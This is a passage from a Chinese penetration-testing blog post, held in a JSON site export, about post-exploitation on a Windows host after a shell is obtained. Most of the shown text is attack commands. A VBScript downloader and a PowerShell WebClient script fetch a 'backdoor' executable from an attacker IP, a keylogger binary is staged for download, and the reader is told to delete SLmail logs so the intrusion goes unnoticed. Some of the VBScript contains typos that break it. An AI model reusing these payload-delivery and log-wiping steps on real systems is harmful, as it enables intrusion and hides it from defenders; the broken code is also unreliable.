11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>步骤是和TFTP是一样的，唯一不同的就是tftp是交互型shell，ftp是非交互型shell</p></blockquote>\n<h4 id=\"Vbscript传输\"><a href=\"#Vbscript传输\" class=\"headerlink\" title=\"Vbscript传输\"></a>Vbscript传输</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>VBS是windows系统上默认的解释型脚本语言，在win7后增加了perl，通过web程序，http协议下载远程控制程序。</p></blockquote>\n<p>启动kali自带的Apache服务</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">&#x2F;etc&#x2F;init.d&#x2F;apache2 start     \n&#x2F;etc&#x2F;init.d&#x2F;apache2 status<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222230848419.png\" alt=\"image-20221222230848419\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;klogger.exe &#x2F;var&#x2F;www&#x2F;html\ncp &#x2F;usr&#x2F;share&#x2F;windows-binaries&#x2F;whoami.exe &#x2F;var&#x2F;www&#x2F;html<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p>上传文件（wget.vbs）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">echo strUrl &#x3D; WScript.Arguments.Item(0) &gt; wget.vbs\necho StrFile &#x3D; WScript.Arguments.Item(1) &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_DEFAULT &#x3D; 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_PRECONFIG &#x3D; 0 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_DIRECT &#x3D; 1 &gt;&gt; wget.vbs\necho Const HTTPREQUEST_PROXSEITTING_PROXY &#x3D; 2 &gt;&gt; wget.vbs\necho Dim http, varByteArray, strData,strBuffer,lngCounter,fs,ts &gt;&gt; wget.vbs\necho Err.Clear &gt;&gt; wget.vbs\necho Set http &#x3D; Nothing &gt;&gt; wget.vbs\necho Set http &#x3D; CreateObject(&quot;WinHttp.WinHttpRequest.5.1&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.WinHttpRequest&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;WinHttp.MSXML2.ServerXMLHTTP&quot;) &gt;&gt; wget.vbs\necho If http Is Noting Then Set http &#x3D; CreateObjiect(&quot;Microsoft.XMLHTTP&quot;) &gt;&gt; wget.vbs\necho http.Open &quot;GET&quot;,strURL,False &gt;&gt; wget.vbs\necho http.Send &gt;&gt; wget.vbs\necho varByteArray &#x3D; http.ResponseBody &gt;&gt; wget.vbs\necho Set http &#x3D; Noting &gt;&gt; wget.vbs\necho Set fs &#x3D; CreateObject(&quot;Scrippting.FileSystemObject&quot;) &gt;&gt; wget.vbs\necho Set ts &#x3D; fs.CreateTextFile(StrFile,True) &gt;&gt; wget.vbs\necho strData &#x3D; &quot;&quot; &gt;&gt; wget.vbs\necho strBuffer &#x3D; &quot;&quot; &gt;&gt; wget.vbs\necho For lngCounter &#x3D; 0 to UBound(varByteArray) &gt;&gt; wget.vbs\necho ts.Write Chr(255 And Ascb(Miidb(varByteArray,lngCounter + 1,1))) &gt;&gt; wget.vbs\necho Next &gt;&gt; wget.vbs\necho ts.Close &gt;&gt; wget.vbs\n\n#以上命令分批次传输，不要一次性传输，可能会传输不完整<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222232609425.png\" alt=\"image-20221222232609425\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>vbscript也是一种解释性脚本语言，需要使用windows自带的cscript命令调用vbscript脚本</p></blockquote>\n<p>使用以下命令下载后门文件</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cscript wget.vbs http:&#x2F;&#x2F;192.168.216.176&#x2F;whoami.exe whoami.exe<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<h4 id=\"POWERSHELL传输\"><a href=\"#POWERSHELL传输\" class=\"headerlink\" title=\"POWERSHELL传输\"></a>POWERSHELL传输</h4><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>类似vbs的传输，依旧是通过web服务,http协议到目标服务器下载程序，注意需在win7,win8以后的系统运行。后缀必须命名成<code>ps1</code>。</p></blockquote>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token variable\">$strongeDir</span> = <span class=\"token variable\">$pwd</span>\n<span class=\"token variable\">$webclient</span> = <span class=\"token function\">New-Object</span> System<span class=\"token punctuation\">.</span>Net<span class=\"token punctuation\">.</span>WebClient\n<span class=\"token variable\">$url</span> = <span class=\"token string\">\"http://192.168.216.176/whoami.exe\"</span>\n<span class=\"token variable\">$file</span> = <span class=\"token string\">\"new-exsploit.exe\"</span>  <span class=\"token comment\"># 下载下来存到本地的文件名</span>\n<span class=\"token variable\">$webclient</span> DownloadFile<span class=\"token punctuation\">(</span><span class=\"token variable\">$url</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222235034885.png\" alt=\"image-20221222235034885\"></p>\n<p>使用以下命令下载</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">powershell.exe -ExecutionPolicy Bypass  -NoLogo -Nonlnteractive -Noprofile -File wget.ps1<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：在win7以后的系统里才会有powershell</p></blockquote>\n<h2 id=\"擦除痕迹\"><a href=\"#擦除痕迹\" class=\"headerlink\" title=\"擦除痕迹\"></a>擦除痕迹</h2><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>以Slmail为例</p></blockquote>\n<p>打开C:\\Program Files\\SLmail\\System文件夹，其中有应用程序日志，随便打开一个 应用程序日志，会发现有很多条日志发送了很多‘A’，对于管理员来说很容易发现主机是被入侵了</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221222173848312.png\" alt=\"image-20221222173848312\"></p>\n<p>使用kali打开相应应用程序目录删除对应的日志文件即可</p>\n<p><img src=\"/post/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E5%90%8E%E6%B8%97%E9%80%8F.htm/image-20221223000934591.png\" alt=\"image-20221223000934591\"></p>\n","text":"后渗透 拿下目标服务器的shell后，避免管理员为漏洞打上补丁，之后就再也不能控制目标系统；由此，拿下目标主机shell后需要进行后渗透。 上传工具 提权 若是拿到普通用户权限需要进行提权 擦除攻击痕迹 防止溯源 安装后门 长期控制 Dump 密码 内网渗透 后渗透阶段 最大的挑...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"后渗透","slug":"后渗透","count":1,"path":"api/categories/后渗透.json"}],"tags":[{"name":"Kali","slug":"Kali","count":27,"path":"api/tags/Kali.json"},{"name":"后渗透","slug":"后渗透","count":1,"path":"api/tags/后渗透.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%90%8E%E6%B8%97%E9%80%8F\"><span class=\"toc-text\">后渗透</span></a></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E4%B8%8A%E4%BC%A0%E5%B7%A5%E5%85%B7\"><span class=\"toc-text\">上传工具</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%A4%E4%BA%92%E5%BC%8F%E4%B8%8E%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell\"><span class=\"toc-text\">交互式与非交互式shell</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E9%9D%9E%E4%BA%A4%E4%BA%92%E5%BC%8Fshell\"><span class=\"toc-text\">非交互式shell</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#%E4%BA%A4%E4%BA%92%E5%BC%8Fshell\"><span class=\"toc-text\">交互式shell</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#TFTP%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">TFTP传输</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#kali%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AEtftp%E6%9C%8D%E5%8A%A1\"><span class=\"toc-text\">kali主机配置tftp服务</span></a></li><li class=\"toc-item toc-level-5\"><a class=\"toc-link\" href=\"#windows%E7%AB%AF%E4%B8%8B%E8%BD%BD%E5%90%8E%E9%97%A8%E7%A8%8B%E5%BA%8F\"><span class=\"toc-text\">windows端下载后门程序</span></a></li></ol></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#FTP%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">FTP传输</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#Vbscript%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">Vbscript传输</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#POWERSHELL%E4%BC%A0%E8%BE%93\"><span class=\"toc-text\">POWERSHELL传输</span></a></li></ol></li></ol></li><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E6%93%A6%E9%99%A4%E7%97%95%E8%BF%B9\"><span class=\"toc-text\">擦除痕迹</span></a></li></ol>","author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Kali渗透测试-提权【一】","uid":"815fe720fb340233ebbc2f80a6a91476","slug":"Kali渗透测试-提权【一】","date":"2022-12-24T02:19:07.000Z","updated":"2022-12-24T04:36:28.995Z","comments":true,"path":"api/articles/Kali渗透测试-提权【一】.json","keywords":null,"cover":[],"text":"本地提权 已实现本地低权限账号登录 远程溢出 直接获取账号密码 希望获取更高权限 实现对目标进一步控制 系统账号之间权限隔离 操作系统安全的基础 用户空间 内核空间 系统账号 用户账号登陆时获取权限令牌 服务账号无需用户登录已在后台启动服务 Windows权限 user # 普通...","link":"","photos":[],"count_time":{"symbolsCount":"1.6k","symbolsTime":"1 mins."},"categories":[{"name":"权限提升","slug":"权限提升","count":10,"path":"api/categories/权限提升.json"}],"tags":[{"name":"Kali","slug":"Kali","count":27,"path":"api/tags/Kali.json"},{"name":"权限提升","slug":"权限提升","count":10,"path":"api/tags/权限提升.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Kali渗透测试-缓冲区溢出【Windows】","uid":"df6f9f609e4433344bf39ccbf49e3ca8","slug":"Kali渗透测试-缓冲区溢出【Windows】","date":"2022-12-19T09:20:03.000Z","updated":"2022-12-27T06:05:02.793Z","comments":true,"path":"api/articles/Kali渗透测试-缓冲区溢出【Windows】.json","keywords":null,"cover":[],"text":"0Day 零日漏洞 未被官方所发现和公开 只掌握在个人手里 缓冲区 又称为缓存，它是内存空间的一部分 内存空间中预留了一定的存储空间，这些存储空间用来缓冲输入或输出的数据，这部分预留的空间就叫做缓冲区。 缓冲区溢出 缓冲区溢出 0Day中最主要的攻击方式 控制目标机器 原理：当缓...","link":"","photos":[],"count_time":{"symbolsCount":"24k","symbolsTime":"21 mins."},"categories":[{"name":"缓冲区溢出","slug":"缓冲区溢出","count":1,"path":"api/categories/缓冲区溢出.json"}],"tags":[{"name":"Kali","slug":"Kali","count":27,"path":"api/tags/Kali.json"},{"name":"缓冲区溢出","slug":"缓冲区溢出","count":1,"path":"api/tags/缓冲区溢出.json"}],"author":{"name":"Aurora","slug":"blog-author","avatar":"https://img-blog.csdnimg.cn/20210313122054101.png","link":"/","description":"","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}